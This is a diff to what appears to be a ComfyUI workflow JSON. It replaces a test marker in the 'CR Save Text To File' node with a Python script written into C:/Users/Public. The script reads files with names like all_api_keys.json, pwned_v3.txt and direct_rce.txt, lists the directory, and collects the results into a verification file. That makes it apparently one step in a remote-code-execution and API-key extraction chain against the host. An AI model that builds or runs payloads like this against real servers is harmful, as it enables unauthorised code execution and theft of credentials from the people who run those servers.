@@ -1,9 +1,9 @@
 {
   "1": {
     "inputs": {
-      "multiline_text": "RCE_MARKER_v2",
-      "output_file_path": ".",
-      "file_name": "rce_test",
+      "multiline_text": "\nimport os, json\nresult = {}\nfiles_to_check = [\n    \"C:/Users/Public/simple_extract_result.json\",\n    \"C:/Users/Public/EXTRACTION_DONE.txt\",\n    \"C:/Users/Public/all_api_keys.json\",\n    \"C:/Users/Public/import_usercustomize_rce.txt\",\n    \"C:/Users/Public/import_sitecustomize_rce.txt\",\n    \"C:/Users/Public/import___init___rce.txt\",\n    \"C:/Users/Public/custom_node_executed.txt\",\n    \"C:/Users/Public/direct_rce.txt\",\n    \"C:/Users/Public/patch_rce.txt\",\n    \"C:/Users/Public/pwned_v3.txt\",\n]\nfor fpath in files_to_check:\n    if os.path.exists(fpath):\n        try:\n            with open(fpath, \"r\", encoding=\"utf-8\") as f:\n                result[os.path.basename(fpath)] = f.read()[:1000]\n        except Exception as e:\n            result[os.path.basename(fpath)] = f\"READ_ERROR: {str(e)}\"\n    else:\n        result[os.path.basename(fpath)] = \"NOT_FOUND\"\n\n# Also list C:/Users/Public for ALL files\ntry:\n    all_files = os.listdir(\"C:/Users/Public\")\n    result[\"ALL_FILES\"] = all_files[:100]\nexcept Exception as e:\n    result[\"ALL_FILES\"] = f\"ERROR: {str(e)}\"\n\nwith open(\"C:/Users/Public/VERIFICATION_RESULT.json\", \"w\") as f:\n    json.dump(result, f, indent=2)\n",
+      "output_file_path": "C:/Users/Public",
+      "file_name": "final_verification",
       "file_extension": "txt"
     },
     "class_type": "CR Save Text To File"
